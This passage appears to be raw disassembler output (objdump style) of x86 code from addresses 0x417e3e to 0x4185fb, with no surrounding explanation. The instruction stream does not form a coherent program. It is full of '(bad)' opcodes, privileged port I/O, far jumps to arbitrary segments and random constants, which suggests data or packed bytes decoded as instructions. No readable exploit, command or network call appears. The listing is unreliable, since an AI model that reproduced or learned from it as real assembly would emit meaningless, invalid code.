  417e3e:	or     eax,0x1f560d5
  417e43:	loop   0x417dc6
  417e45:	push   ss
  417e46:	stos   DWORD PTR es:[edi],eax
  417e47:	popf   
  417e48:	pop    ebp
  417e49:	fisttp DWORD PTR ds:0x425e93b4
  417e4f:	mov    dl,0xbb
  417e51:	iret   
  417e52:	sbb    al,BYTE PTR [ebx+ebp*2-0x348c65de]
  417e59:	cmp    cl,BYTE PTR [ebp+esi*1+0x1f]
  417e5d:	dec    esi
  417e5e:	es out 0xc4,eax
  417e61:	or     al,0xb6
  417e63:	add    DWORD PTR [esi+0x26],0x1c9a01fa
  417e6a:	xor    al,BYTE PTR [edx-0x6f]
  417e6d:	mov    bh,0x3a
  417e6f:	push   eax
  417e70:	sub    ch,cl
  417e72:	fadd   DWORD PTR [ebp-0x28caaac8]
  417e78:	cli    
  417e79:	stc    
  417e7a:	rol    DWORD PTR [eax-0x15559742],0x10
  417e81:	sub    ecx,DWORD PTR [edx+0x5f]
  417e84:	rol    BYTE PTR [ecx],1
  417e86:	jae    0x417e31
  417e88:	sahf   
  417e89:	data16 mov BYTE PTR [edi+edi*8],ah
  417e8d:	xchg   ebx,esi
  417e8f:	pop    ecx
  417e90:	adc    BYTE PTR [ebp+0x7a],cl
  417e93:	sar    DWORD PTR [ebp+0x6e3c7a00],0xd2
  417e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e9b:	repnz repnz mov ch,0xd3
  417e9f:	or     DWORD PTR ds:0x62ea8beb,esi
  417ea5:	push   esp
  417ea6:	lea    ecx,[edx-0x50591a72]
  417eac:	lock retf 0xdf28
  417eb0:	std    
  417eb1:	xlat   BYTE PTR ds:[ebx]
  417eb2:	push   ebp
  417eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eb4:	or     BYTE PTR [esi],bl
  417eb6:	inc    esi
  417eb7:	mov    al,ds:0x2af3cc1b
  417ebc:	lds    edx,FWORD PTR [esi+0x5f9bba58]
  417ec2:	rcl    DWORD PTR [eax+0x20],cl
  417ec5:	sbb    edx,edi
  417ec7:	sbb    ebx,eax
  417ec9:	inc    ecx
  417eca:	out    dx,al
  417ecb:	xchg   DWORD PTR [eax-0x2e],esi
  417ece:	push   edi
  417ecf:	mov    esi,0x498c2bef
  417ed4:	add    BYTE PTR [esi+0x4f88ea90],ch
  417eda:	pop    ebx
  417edb:	mov    ds:0x4fdae226,al
  417ee0:	push   cs
  417ee1:	pop    ds
  417ee2:	lods   al,BYTE PTR ds:[esi]
  417ee3:	pop    ecx
  417ee4:	sub    DWORD PTR [edi+0x1a],0xd089544d
  417eeb:	(bad)  
  417eec:	jmp    0xbfe9:0xe1c4d1c7
  417ef3:	xor    esp,ebp
  417ef5:	popf   
  417ef6:	push   ecx
  417ef7:	xor    cl,BYTE PTR ds:0xb387401
  417efd:	test   eax,0x8f9a5add
  417f02:	jmp    0x417f7c
  417f04:	inc    edx
  417f05:	imul   esi,DWORD PTR [eax-0x525bfa57],0xe6b81bd8
  417f0f:	mov    ch,0xd2
  417f11:	jno    0x417ed2
  417f13:	es inc eax
  417f15:	es pop es
  417f17:	popa   
  417f18:	cmp    bh,BYTE PTR [eax+0x5672537b]
  417f1e:	fadd   st,st(7)
  417f20:	lds    esp,FWORD PTR [ebx-0xbc2ae2c]
  417f26:	neg    BYTE PTR ds:0x23a89459
  417f2c:	mov    al,ds:0xc140f1b1
  417f31:	imul   ebp,DWORD PTR [esi],0xc71db2e9
  417f37:	pop    ebp
  417f38:	jne    0x417f4b
  417f3a:	or     al,0x52
  417f3c:	shl    ch,0xe8
  417f3f:	rcl    DWORD PTR [eax],cl
  417f41:	call   0x454:0xbc12344c
  417f48:	and    DWORD PTR [eax],eax
  417f4a:	xor    DWORD PTR [esi],ebx
  417f4c:	gs push eax
  417f4e:	jp     0x417f60
  417f50:	imul   edx,DWORD PTR [ebp-0x22313d09],0xffffffc5
  417f57:	(bad)  
  417f58:	push   esi
  417f59:	push   ss
  417f5a:	dec    eax
  417f5b:	pop    ds
  417f5c:	mov    BYTE PTR [esi-0x64],dl
  417f5f:	fld    QWORD PTR [edi]
  417f61:	imul   eax,esp,0xffffffdf
  417f64:	daa    
  417f65:	test   al,0x36
  417f67:	mov    ch,0xfc
  417f69:	imul   esi,edi,0xdb105f42
  417f6f:	loope  0x417ef8
  417f71:	in     al,0xbc
  417f73:	lds    eax,FWORD PTR [eax]
  417f75:	and    BYTE PTR [esi-0x4f],ch
  417f78:	imul   ebx,DWORD PTR [eax-0x3698334],0x51b9b2ec
  417f82:	je     0x417f7b
  417f84:	lods   eax,DWORD PTR ds:[esi]
  417f85:	dec    BYTE PTR [edi]
  417f87:	add    ecx,DWORD PTR [esi-0x1dbe8076]
  417f8d:	or     BYTE PTR [eax+0x4],ch
  417f90:	lahf   
  417f91:	and    edi,DWORD PTR [eax-0x2849ff57]
  417f97:	ror    BYTE PTR [ebp-0xfae1a9f],1
  417f9d:	aam    0x73
  417f9f:	icebp  
  417fa0:	call   FWORD PTR [esi-0x29]
  417fa3:	les    ebx,FWORD PTR [edi+0xc]
  417fa6:	xchg   esp,eax
  417fa7:	push   esi
  417fa8:	jb     0x417fee
  417faa:	push   esi
  417fab:	push   ds
  417fac:	fnstcw WORD PTR [eax]
  417fae:	daa    
  417faf:	ins    DWORD PTR es:[edi],dx
  417fb0:	mov    esp,0x77c72cc5
  417fb5:	mov    dh,0x5a
  417fb7:	jmp    0x417f97
  417fb9:	(bad)  [ecx]
  417fbb:	pusha  
  417fbc:	(bad)  
  417fbd:	loop   0x418015
  417fbf:	aad    0x35
  417fc1:	or     al,0x11
  417fc3:	sub    ebx,edi
  417fc5:	or     dh,0xd2
  417fc8:	inc    edx
  417fc9:	xchg   ebp,eax
  417fca:	inc    eax
  417fcb:	das    
  417fcc:	jmp    0x441d2aba
  417fd1:	out    0x78,eax
  417fd3:	enter  0x9e1c,0x75
  417fd7:	and    ebp,ecx
  417fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fda:	xor    ah,BYTE PTR [edx+0x2b86ba4c]
  417fe0:	jb     0x417fd4
  417fe2:	addr16 mov bl,0xf0
  417fe5:	popa   
  417fe6:	loop   0x417f97
  417fe8:	xor    BYTE PTR [edx-0x5bffa089],ah
  417fee:	lea    esp,[edx-0x777c0ff]
  417ff4:	fisubr DWORD PTR [esi-0x2b]
  417ff7:	mov    edi,0x4b1d208c
  417ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ffd:	ins    DWORD PTR es:[edi],dx
  417ffe:	cmp    ebp,DWORD PTR [eax]
  418000:	xchg   esi,eax
  418001:	into   
  418002:	adc    DWORD PTR [edi],esp
  418004:	lock jmp 0x41806e
  418007:	lods   al,BYTE PTR ds:[esi]
  418008:	into   
  418009:	mov    DWORD PTR [ebx-0x4],ebp
  41800c:	dec    ecx
  41800d:	shl    DWORD PTR [edi+ebp*8+0x6b],1
  418011:	push   cs
  418012:	call   0xf67:0x615e7bab
  418019:	repnz sub ebp,DWORD PTR [ebx-0x4c]
  41801d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41801e:	mov    cl,0x70
  418020:	jmp    0x417fc6
  418022:	inc    eax
  418023:	test   BYTE PTR [edx+0x380fc3ec],bl
  418029:	loopne 0x418011
  41802b:	inc    edi
  41802c:	into   
  41802d:	popf   
  41802e:	xchg   edi,eax
  41802f:	pop    es
  418030:	pop    esp
  418031:	mov    edx,0x14a4b394
  418036:	xchg   DWORD PTR [edi],ebx
  418038:	(bad)  
  418039:	stc    
  41803a:	std    
  41803b:	xchg   edx,eax
  41803c:	inc    ecx
  41803d:	in     al,dx
  41803e:	fcmovbe st,st(3)
  418040:	add    al,0x52
  418042:	mov    ch,0x2c
  418044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418045:	loopne 0x417fde
  418047:	dec    edx
  418048:	aam    0xf0
  41804a:	test   al,0xeb
  41804c:	fdivr  DWORD PTR [ebx]
  41804e:	ucomiss xmm3,DWORD PTR [ebx]
  418051:	cmp    ch,ch
  418053:	mov    DWORD PTR [eax+0x6460d89b],esi
  418059:	mov    dh,0x1
  41805b:	imul   edi,DWORD PTR [ecx],0x1ece122e
  418061:	cmp    BYTE PTR [ecx],ah
  418063:	add    BYTE PTR [ecx+0x1e9cc661],bl
  418069:	xchg   edi,eax
  41806a:	inc    ebx
  41806b:	push   0xffffff9e
  41806d:	or     al,0xce
  41806f:	fsub   DWORD PTR [ebx+0x7604cd14]
  418075:	clc    
  418076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418077:	int3   
  418078:	adc    al,0x94
  41807a:	aaa    
  41807b:	mov    ebp,0x632797f1
  418080:	xchg   ebp,eax
  418081:	(bad)  
  418082:	push   ds
  418083:	and    cl,al
  418085:	ss push edi
  418087:	xchg   ebp,eax
  418088:	cmp    ebp,DWORD PTR [edx-0x5219527b]
  41808e:	xchg   ecx,eax
  41808f:	xchg   DWORD PTR [ebx+0x33b7acc3],eax
  418095:	stos   DWORD PTR es:[edi],eax
  418096:	sub    eax,0x57fc5b39
  41809b:	add    cl,al
  41809d:	mov    ebx,0x794a9543
  4180a2:	cs mov bh,0x34
  4180a5:	adc    BYTE PTR [ebx-0x3753d488],0x42
  4180ac:	aaa    
  4180ad:	fnstenv [esi+eax*8+0x60]
  4180b1:	cld    
  4180b2:	cdq    
  4180b3:	pop    ebp
  4180b4:	(bad)  
  4180b5:	test   DWORD PTR [esi],0x7056b258
  4180bb:	loop   0x418052
  4180bd:	or     DWORD PTR [ecx-0x30],0xdc240410
  4180c4:	jge    0x41809f
  4180c6:	rcl    DWORD PTR [eax-0x174473c2],0x73
  4180cd:	jle    0x418055
  4180cf:	adc    BYTE PTR [edx],dl
  4180d1:	dec    edi
  4180d2:	add    eax,0xbe53e585
  4180d7:	fild   QWORD PTR [ebx]
  4180d9:	fldcw  WORD PTR ds:0xa029bc68
  4180df:	leave  
  4180e0:	cmc    
  4180e1:	xor    ah,bl
  4180e3:	jns    0x418135
  4180e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180e6:	imul   ebx,ebx,0x60
  4180e9:	adc    BYTE PTR [ecx+eiz*8+0x268dda09],bl
  4180f0:	aaa    
  4180f1:	fucom  st(7)
  4180f3:	int3   
  4180f4:	and    BYTE PTR [edi-0x52f0fa7b],bh
  4180fa:	mov    ebp,0x2a1cce8c
  4180ff:	(bad)  
  418100:	js     0x4180a4
  418102:	data16 jg 0x418135
  418105:	mov    eax,0xfb3d2c80
  41810a:	rcl    BYTE PTR [eax],cl
  41810c:	rcl    DWORD PTR [esp+ebp*1],1
  41810f:	call   0x70c10691
  418114:	mov    BYTE PTR fs:[ebx-0x18],0xda
  418119:	or     eax,0xd11e343d
  41811e:	pop    ebp
  41811f:	and    cl,BYTE PTR [edx-0x4c]
  418122:	or     eax,0x52cf62f6
  418127:	cmp    dl,al
  418129:	adc    cl,bl
  41812b:	outs   dx,DWORD PTR ds:[esi]
  41812c:	push   es
  41812d:	enter  0xa7d3,0xb4
  418131:	mov    al,ds:0x18201cf1
  418136:	repnz push es
  418138:	(bad)  
  418139:	sbb    BYTE PTR [edx+0x25],dh
  41813c:	push   ds
  41813d:	into   
  41813e:	cmc    
  41813f:	and    al,dh
  418141:	xchg   ecx,eax
  418142:	lahf   
  418143:	xchg   ebx,eax
  418144:	or     eax,0x5c7acc37
  418149:	mov    bl,0xe5
  41814b:	and    al,ah
  41814d:	xor    ebp,esp
  41814f:	ins    DWORD PTR es:[edi],dx
  418150:	mov    ebp,0xa81d5167
  418155:	pop    esp
  418156:	dec    esi
  418157:	cmp    al,0x69
  418159:	and    BYTE PTR [eax+esi*2+0x31],0xe7
  41815e:	and    ah,cl
  418160:	(bad)
  418163:	call   0x51d9:0x771484ad
  41816a:	or     al,0xe6
  41816c:	and    eax,DWORD PTR [esi]
  41816e:	adc    al,0x51
  418171:	inc    edi
  418172:	ror    BYTE PTR [edi-0x3a3ce9fe],1
  418178:	shl    ebp,0x14
  41817b:	push   0xc7da9075
  418180:	xor    ecx,DWORD PTR [ecx-0x7583f777]
  418186:	or     eax,0x1236677a
  41818b:	leave  
  41818c:	cmp    BYTE PTR [ecx+0x47],bl
  41818f:	fucomi st,st(2)
  418191:	mov    fs,WORD PTR [edi]
  418193:	icebp  
  418194:	addr16 dec eax
  418196:	shl    DWORD PTR [eax],cl
  418198:	push   edi
  418199:	setns  BYTE PTR [esi+0x432a1e82]
  4181a0:	jns    0x418191
  4181a2:	and    al,0x63
  4181a4:	jbe    0x4181b4
  4181a6:	xor    al,0x8
  4181a8:	pop    es
  4181a9:	and    DWORD PTR [esi],edx
  4181ab:	add    ecx,DWORD PTR [ecx]
  4181ad:	test   DWORD PTR [eax+0x17481eb1],ebp
  4181b3:	cmp    eax,0x821ed77e
  4181b8:	outs   dx,DWORD PTR ds:[esi]
  4181b9:	test   BYTE PTR [ebx],ch
  4181bb:	push   ebx
  4181bc:	rol    bl,1
  4181be:	ins    BYTE PTR es:[edi],dx
  4181bf:	stos   DWORD PTR es:[edi],eax
  4181c0:	repz xor BYTE PTR [esp+eax*1-0x6a898ab7],cl
  4181c8:	or     al,0x40
  4181ca:	mov    esi,0xa10fd221
  4181cf:	lea    eax,[ecx-0x11]
  4181d2:	in     al,0xae
  4181d4:	fidiv  WORD PTR [ecx+0x11e1528a]
  4181da:	mov    ebx,0x4783f38e
  4181df:	mov    edx,0xdeb4edbb
  4181e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181e5:	mov    eax,ds:0x43bed57d
  4181ea:	cmp    al,0xdb
  4181ec:	ins    BYTE PTR es:[edi],dx
  4181ed:	lods   eax,DWORD PTR ds:[esi]
  4181ee:	add    al,0x4f
  4181f0:	xchg   esi,eax
  4181f1:	lods   eax,DWORD PTR ds:[esi]
  4181f2:	cmp    DWORD PTR [ebx],0xd4472501
  4181f8:	sbb    esp,DWORD PTR [ebp+edx*4-0x1f]
  4181fc:	arpl   WORD PTR ds:0x11944d30,di
  418202:	out    0xd4,al
  418204:	leave  
  418205:	add    al,0xba
  418207:	gs mov ebx,eax
  41820a:	jmp    0xae219740
  41820f:	adc    al,0xe9
  418212:	sub    ch,BYTE PTR [esi+0x58]
  418215:	imul   cl
  418217:	pop    es
  418218:	lea    edi,[ecx+0x7d12cd0c]
  41821e:	and    DWORD PTR [eax+0x19],esp
  418221:	out    0x36,al
  418223:	je     0x41826c
  418225:	inc    ebx
  418226:	adc    bh,BYTE PTR [edx]
  418228:	into   
  418229:	ss out 0x7b,eax
  41822c:	ins    BYTE PTR es:[edi],dx
  41822d:	hlt    
  41822e:	add    esp,DWORD PTR [ebp+0x3e1b2f34]
  418234:	mov    al,0x8f
  418236:	xlat   BYTE PTR ds:[ebx]
  418237:	(bad)  
  418238:	or     BYTE PTR [edi+eax*1],bl
  41823b:	lea    eax,[ebx]
  41823d:	loop   0x418259
  41823f:	mov    ah,BYTE PTR [eax]
  418241:	ret    
  418242:	cmp    eax,0x37407a42
  418247:	mov    edx,0xb407a9e0
  41824c:	(bad)  
  41824d:	daa    
  41824e:	xchg   ecx,edx
  418250:	inc    edi
  418251:	and    esi,eax
  418253:	cli    
  418254:	call   0x7c6a85e2
  418259:	push   eax
  41825a:	bound  esi,QWORD PTR [ecx+0x36e3d85c]
  418260:	repz and DWORD PTR [edi-0x511ae9fa],ebx
  418267:	sub    ebx,edx
  418269:	jle    0x418262
  41826b:	push   edx
  41826c:	xchg   ebp,eax
  41826d:	sbb    ch,BYTE PTR [eax]
  41826f:	jp     0x418219
  418271:	mov    eax,0xb19647aa
  418276:	mov    eax,0xc1a4ade2
  41827b:	pop    eax
  41827c:	hlt    
  41827d:	outs   dx,BYTE PTR ds:[esi]
  41827e:	in     al,dx
  41827f:	mov    ch,0x3c
  418281:	push   eax
  418282:	jns    0x41824e
  418284:	adc    ch,BYTE PTR [esi]
  418286:	or     eax,0x278209a4
  41828b:	stc    
  41828c:	mov    bh,BYTE PTR [ebx+eiz*4+0x1297496b]
  418293:	cld    
  418294:	(bad)  [ebp-0x1a]
  418297:	mov    al,ds:0x1993e82e
  41829c:	push   es
  41829d:	popf   
  41829e:	cs inc ebx
  4182a0:	out    dx,al
  4182a1:	imul   esp,DWORD PTR [eax+0x63],0xc8deb63b
  4182a8:	ins    BYTE PTR es:[edi],dx
  4182a9:	or     BYTE PTR ds:0xbc50cda2,0xe4
  4182b0:	jnp    0x4182c7
  4182b2:	add    BYTE PTR [edi],cl
  4182b4:	fst    DWORD PTR [edx]
  4182b6:	xor    eax,0x17210255
  4182bb:	ja     0x4182a9
  4182bd:	outs   dx,BYTE PTR ds:[esi]
  4182be:	(bad)  [edi-0x1a]
  4182c1:	(bad)  
  4182c2:	in     eax,dx
  4182c3:	int    0xa8
  4182c5:	adc    ebx,DWORD PTR [ecx-0xe]
  4182c8:	push   ebp
  4182c9:	arpl   WORD PTR [edi],cx
  4182cb:	in     eax,0xd8
  4182cd:	sti    
  4182ce:	jle    0x41825a
  4182d0:	jp     0x418346
  4182d2:	pop    esi
  4182d3:	mov    ds:0xa86a53e7,eax
  4182d8:	sub    eax,0x7b27ea31
  4182dd:	xchg   ebx,eax
  4182de:	int3   
  4182df:	push   0x697280d0
  4182e4:	pusha  
  4182e5:	les    ebp,FWORD PTR [edi-0x219cf3ba]
  4182eb:	pushf  
  4182ec:	loop   0x41829c
  4182ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182ef:	push   esi
  4182f0:	cwde   
  4182f1:	inc    edi
  4182f2:	push   ds
  4182f3:	xchg   ebp,eax
  4182f4:	mov    WORD PTR [eax+0x5d],?
  4182f7:	xchg   ebp,eax
  4182f8:	adc    ch,BYTE PTR [edx-0x32]
  4182fb:	pop    ebx
  4182fc:	dec    ebx
  4182fd:	push   cs
  4182fe:	push   edi
  4182ff:	cs and eax,0x542b157a
  418305:	sbb    eax,0x7a3ed2
  41830a:	adc    DWORD PTR [edi],esi
  41830c:	test   BYTE PTR [ebx],bh
  41830e:	pop    edx
  41830f:	outs   dx,DWORD PTR ds:[esi]
  418310:	mov    bl,0x75
  418313:	inc    esp
  418314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418315:	scas   al,BYTE PTR es:[edi]
  418316:	sub    BYTE PTR [edx],cl
  418318:	shl    DWORD PTR [ecx],cl
  41831a:	xor    al,0x67
  41831c:	imul   edx,DWORD PTR gs:[edi],0xffffffd5
  418320:	cdq    
  418321:	int    0xe3
  418323:	mov    bl,0xa
  418325:	xchg   esp,eax
  418326:	sub    BYTE PTR [ebp+edx*4+0x29214c9e],cl
  41832d:	jle    0x4182b2
  41832f:	jp     0x41833e
  418331:	cmp    al,0x31
  418333:	ret    
  418334:	stc    
  418335:	in     eax,0xa3
  418337:	dec    ecx
  418338:	pop    ds
  418339:	add    esp,DWORD PTR [eax-0x5067cf3f]
  41833f:	(bad)  
  418340:	addr16 test eax,0xc26a0310
  418346:	and    BYTE PTR [edx-0x37],dl
  418349:	jge    0x418356
  41834b:	pop    esi
  41834c:	mov    ch,0xd4
  41834e:	ins    DWORD PTR es:[edi],dx
  41834f:	push   0xf9bfc75b
  418354:	ffree  st(2)
  418356:	push   es
  418357:	inc    edx
  418358:	adc    dl,BYTE PTR [edx]
  41835a:	lahf   
  41835b:	sbb    ah,BYTE PTR ds:0xc0278c10
  418361:	je     0x41831e
  418363:	cdq    
  418364:	jge    0x418337
  418366:	mov    dh,0x56
  418368:	add    eax,0x39797728
  41836d:	mov    ecx,0x83169d4
  418372:	xchg   edx,eax
  418373:	or     bh,cl
  418375:	jae    0x4183c5
  418377:	pop    ecx
  418378:	sub    eax,DWORD PTR [ecx]
  41837a:	out    dx,eax
  41837b:	cwde   
  41837c:	or     ebx,edx
  41837e:	popa   
  41837f:	lds    esp,FWORD PTR [esi+0xe0af437]
  418385:	(bad)  
  418386:	sbb    eax,ebp
  418388:	daa    
  418389:	(bad)  [bp+si]
  41838c:	test   eax,0xbc2d2c52
  418391:	pop    es
  418392:	jae    0x4183e0
  418394:	or     eax,0xa7802e41
  418399:	pop    ebp
  41839a:	and    ah,BYTE PTR [esi+0x0]
  41839d:	psrad  mm2,QWORD PTR [ebp-0x11cb6aaa]
  4183a4:	pop    esp
  4183a5:	mov    esi,ebp
  4183a7:	ds push eax
  4183a9:	mov    bh,0x5f
  4183ab:	int    0x2d
  4183ad:	push   edi
  4183ae:	bswap  ebp
  4183b0:	shr    BYTE PTR [ebx+0x5f],1
  4183b3:	fstp   DWORD PTR [eax+eax*4]
  4183b6:	sub    DWORD PTR [esi-0x12],0xffffffd0
  4183ba:	(bad)  
  4183bb:	sti    
  4183bc:	xlat   BYTE PTR ds:[ebx]
  4183bd:	cmp    al,0x4f
  4183bf:	push   esi
  4183c0:	pusha  
  4183c1:	xchg   esp,eax
  4183c2:	push   edi
  4183c3:	inc    DWORD PTR [ebp-0x1b]
  4183c6:	ficomp WORD PTR ss:[ecx]
  4183c9:	shr    BYTE PTR [esi-0xf],1
  4183cc:	inc    edi
  4183cd:	aaa    
  4183ce:	cdq    
  4183cf:	ret    0xd67c
  4183d2:	aas    
  4183d3:	or     BYTE PTR ds:0x3a884f05,dl
  4183d9:	lods   eax,DWORD PTR ds:[esi]
  4183da:	add    DWORD PTR ds:0xc4e61505,0x23c25d0
  4183e4:	or     dh,BYTE PTR [ecx+0x2b810b6f]
  4183ea:	cmp    ecx,DWORD PTR [edi+ecx*4+0xb118925]
  4183f1:	test   eax,0x5ef9492c
  4183f6:	iret   
  4183f7:	or     BYTE PTR [esi+0xe],bh
  4183fa:	popf   
  4183fb:	cmp    BYTE PTR [eax-0x4530b23f],ch
  418401:	pop    edx
  418402:	(bad)  
  418403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418404:	mov    ebx,0x3e6a6b82
  418409:	dec    ebx
  41840a:	mov    es,ebx
  41840c:	cli    
  41840d:	out    dx,eax
  41840e:	push   edx
  41840f:	dec    esi
  418410:	das    
  418411:	out    dx,al
  418412:	mov    BYTE PTR [ebx],cl
  418414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418415:	cli    
  418416:	into   
  418417:	add    DWORD PTR fs:[bx-0x16],ebx
  41841c:	mov    eax,ds:0x1df351c6
  418421:	sti    
  418422:	inc    esp
  418423:	xchg   esi,eax
  418424:	pushf  
  418425:	pop    ebp
  418426:	aad    0xaf
  418428:	fucom  st(2)
  41842a:	cmp    al,0x4e
  41842c:	mov    WORD PTR [edx-0x8],?
  41842f:	jno    0x418464
  418431:	mov    al,ds:0x3d22e313
  418436:	xchg   ch,cl
  418438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418439:	dec    esi
  41843a:	test   al,0x9c
  41843c:	lahf   
  41843d:	cli    
  41843e:	ins    BYTE PTR es:[edi],dx
  41843f:	cwde   
  418440:	icebp  
  418441:	pushf  
  418442:	cmp    eax,0xe7418075
  418447:	ret    
  418448:	std    
  418449:	mov    bl,0x64
  41844b:	(bad)  
  41844c:	mov    edx,0xf821e876
  418451:	xchg   edi,eax
  418452:	and    DWORD PTR [ebp+0x277f463e],edi
  418458:	ins    BYTE PTR es:[edi],dx
  418459:	popf   
  41845a:	cli    
  41845b:	enter  0xa762,0x65
  41845f:	or     eax,DWORD PTR [edi]
  418461:	jg     0x4183e5
  418463:	dec    ebp
  418464:	bnd data16 ja 0x4183f4
  418468:	inc    ebp
  418469:	inc    ecx
  41846a:	mov    ds:0xbdc7e52c,al
  41846f:	sbb    BYTE PTR [esi+edx*2],ch
  418472:	push   es
  418473:	in     al,0xc2
  418475:	and    ecx,esi
  418477:	int    0x61
  418479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41847a:	popa   
  41847b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41847c:	iret   
  41847d:	jb     0x4184e5
  41847f:	push   edi
  418480:	aas    
  418481:	cmp    BYTE PTR [ebp+0xa94c2ef],dl
  418487:	xchg   edx,eax
  418488:	inc    esp
  418489:	gs mov ebx,0x8b6cf57c
  41848f:	(bad)  
  418490:	lods   eax,DWORD PTR ds:[esi]
  418491:	ret    0x292
  418494:	in     al,dx
  418495:	daa    
  418496:	call   0x9b1650c0
  41849b:	mov    BYTE PTR [edx],0x57
  41849e:	repz jge 0x418438
  4184a1:	jp     0x418430
  4184a3:	fisub  WORD PTR [eax-0x3b4fa1ea]
  4184a9:	mov    ah,ah
  4184ab:	scas   eax,DWORD PTR es:[edi]
  4184ac:	les    ebx,FWORD PTR ds:0xb84df0ac
  4184b2:	inc    edi
  4184b3:	out    dx,al
  4184b4:	pop    ebx
  4184b5:	call   0xdd98e2eb
  4184ba:	cmp    dl,BYTE PTR [ebp-0x3ec064c2]
  4184c0:	call   0xf76ab303
  4184c5:	clc    
  4184c6:	out    dx,eax
  4184c7:	in     eax,0x52
  4184c9:	dec    esp
  4184ca:	repz aas 
  4184cc:	(bad)  
  4184cd:	ror    bh,1
  4184cf:	(bad)  
  4184d0:	or     eax,0xddc78693
  4184d5:	adc    al,BYTE PTR [edx]
  4184d7:	mov    al,0x4f
  4184d9:	push   es
  4184da:	(bad)  
  4184db:	pop    ds
  4184dc:	test   eax,edx
  4184de:	push   esp
  4184df:	cmp    al,0x3f
  4184e1:	and    al,0xbf
  4184e3:	ja     0x4184f7
  4184e5:	test   BYTE PTR [esi],ah
  4184e7:	popa   
  4184e8:	sbb    edi,edx
  4184ea:	scas   al,BYTE PTR es:[edi]
  4184eb:	les    ebx,FWORD PTR [ecx+0x4a]
  4184ee:	jnp    0x4184c9
  4184f0:	test   eax,0x99708b5f
  4184f5:	(bad)  
  4184f6:	or     cl,ah
  4184f8:	ins    DWORD PTR es:[edi],dx
  4184f9:	cwde   
  4184fa:	xor    al,0xe1
  4184fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184fd:	dec    edx
  4184fe:	mov    eax,DWORD PTR [ebx-0x4495a115]
  418504:	or     al,0x61
  418506:	dec    esp
  418507:	cmp    DWORD PTR [eax-0x4d],ebp
  41850a:	shl    ecx,1
  41850c:	jns    0x41858a
  41850e:	loope  0x418521
  418510:	pop    ebx
  418511:	test   ch,ah
  418513:	mov    dl,0xe4
  418515:	lahf   
  418516:	xlat   BYTE PTR ds:[ebx]
  418517:	cmp    dl,BYTE PTR [ecx]
  418519:	push   edx
  41851a:	or     al,0xef
  41851c:	push   ebx
  41851d:	(bad)
  418521:	inc    edi
  418522:	jmp    0x418504
  418524:	pop    ds
  418525:	pop    esi
  418526:	or     ebp,DWORD PTR [eax-0x2f550e04]
  41852c:	(bad)  
  41852d:	loope  0x418583
  41852f:	pop    eax
  418530:	sub    eax,0x2b998d03
  418535:	and    BYTE PTR [edi-0x1a],bl
  418538:	int    0x25
  41853a:	mov    edi,0x7221231e
  41853f:	cmc    
  418540:	push   ecx
  418541:	inc    ebp
  418542:	inc    ebp
  418543:	rcl    ebx,1
  418545:	jo     0x41858e
  418547:	retf   0x151d
  41854a:	mov    bl,0xed
  41854c:	pop    esi
  41854d:	pop    ecx
  41854e:	sbb    eax,0xfcd2196
  418553:	repnz mov ah,0x88
  418556:	xor    al,0xb4
  418558:	dec    ecx
  418559:	inc    ebp
  41855a:	mov    esi,0xfd2ae464
  41855f:	adc    dl,al
  418561:	inc    edi
  418562:	mov    ds,WORD PTR [ebx-0x4e781fc6]
  418568:	int3   
  418569:	sub    ah,BYTE PTR [ebp+0x30baad1b]
  41856f:	cwde   
  418570:	sub    ebp,edi
  418572:	out    0xbe,eax
  418574:	pop    ecx
  418575:	stos   DWORD PTR es:[edi],eax
  418576:	into   
  418577:	aaa    
  418578:	nop
  418579:	inc    ebx
  41857a:	and    dl,BYTE PTR [esi-0x79]
  41857d:	pop    esi
  41857e:	lods   eax,DWORD PTR ds:[esi]
  41857f:	repnz mov ebx,0xd04bcfcf
  418585:	cs xor dl,cl
  418588:	leave  
  418589:	jno    0x4185c3
  41858b:	iret   
  41858c:	cli    
  41858d:	push   cs
  41858e:	mov    eax,ds:0x55ad01d5
  418593:	inc    ebp
  418594:	sbb    DWORD PTR [eax+0x77bf8c2c],esp
  41859a:	adc    al,0xd3
  41859c:	dec    esp
  41859d:	imul   esi,DWORD PTR [edx],0x4b80addd
  4185a3:	je     0x4185bb
  4185a5:	mov    cl,0xba
  4185a7:	push   es
  4185a8:	mul    BYTE PTR [eax]
  4185aa:	in     eax,0x7e
  4185ac:	lahf   
  4185ad:	fmul   QWORD PTR [ebp*4-0x1d1f48e3]
  4185b4:	cmp    ebx,edi
  4185b6:	push   0xffffff91
  4185b8:	loop   0x4185b5
  4185ba:	push   ecx
  4185bb:	push   ecx
  4185bc:	cwde   
  4185bd:	adc    ah,bl
  4185bf:	rcr    BYTE PTR [eax],cl
  4185c1:	mov    edx,0x4bb5cdd3
  4185c6:	and    dl,BYTE PTR [ebp+0x37]
  4185c9:	fsubr  DWORD PTR [edx-0x340f4507]
  4185cf:	(bad)  
  4185d0:	and    eax,0xce3adde7
  4185d5:	pushf  
  4185d6:	repnz ss add eax,0x148acab9
  4185dd:	in     al,dx
  4185de:	imul   DWORD PTR [ebp-0x10cfe32f]
  4185e4:	bound  edi,QWORD PTR [edi+edx*1]
  4185e7:	push   ecx
  4185e8:	add    DWORD PTR [ebx+0x2f],ecx
  4185eb:	pop    es
  4185ec:	outs   dx,DWORD PTR ds:[esi]
  4185ed:	xchg   ebx,eax
  4185ee:	inc    ecx
  4185ef:	mov    esi,0x6347cdcc
  4185f4:	cwde   
  4185f5:	pop    ecx
  4185f6:	mov    ebp,0x3a4885a1
  4185fb:	dec    ebx
